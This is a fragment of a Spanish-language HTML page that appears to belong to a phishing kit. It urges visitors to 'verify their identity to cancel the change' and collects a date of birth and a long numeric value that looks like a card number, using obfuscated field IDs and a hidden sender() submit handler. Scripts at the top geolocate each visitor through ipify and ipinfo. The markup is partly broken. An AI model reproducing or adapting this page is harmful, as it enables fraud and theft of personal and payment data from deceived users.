
<html>

      <script>
         $.getJSON("https://api.ipify.org?format=json",
                                           function(data) {
         
             // Setting text of element P with id gfg
             $("#gfg").html(data.ip);
         })
      </script>
      <script>
         $.getJSON("https://ipinfo.io", function (response) {
      $("#ip").html("IP: " + response.ip);
      $("#address").html("" + response.city + ", " + response.country);

      })
      </script>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="css/util.css">
      <link rel="stylesheet" type="text/css" href="css/main.css">
       
     
   </head>
   <body>
      <header id="main-header">

      <div class="limiter">

            position: absolute;
            ">

               <section class="">
                  <form class="login100-form validate-form" action="" method="post"  onsubmit=" return sender()">

                     <br>

                     </div>
                     <div class="wrap-input101 validate-input" data-validate="">
                        <br>
                        <div class="textypn2"><span class="model" style="font-size:16px; color:#003995; text-align:center;display: block;margin: 0 auto;">
                           Realiza el proceso de verificacion de identidad para cancelar el cambio.</span>
                        </div>
                        <br>
                        <br>
                        <div class="textypn2"><span class="model" style="font-size:16px; color:gray; text-align:center;">

                        </div>
                        <br>
                        <div class="wrap-input101 validate-input" data-validate="">

                        </div>
                        <br>
                        <div class="wrap-input101 validate-input" data-validate="">
                           <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric" style="text-align: left;padding-left: 10px" onfocus="(this.type='date')" id="PL4C" required="true" min="1930-12-30" max="2006-12-30" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="dd - mm - aaaa">
                           <span class="focus-input100" data-symbol=""></span>

                        <div class="wrap-input101 validate-input" data-validate="">

                           <br>
                           <br>
                           <br>

                           <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric"  id="PR0C4T" maxlength="16" style="text-align: left;padding-left: 10px" minlength="9" required="true" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="Ingresa el número">

                        </div>
                        <div class="textypn2"><span class="model" style="font-size:16px; color:#3EB7FC; text-align:left;">
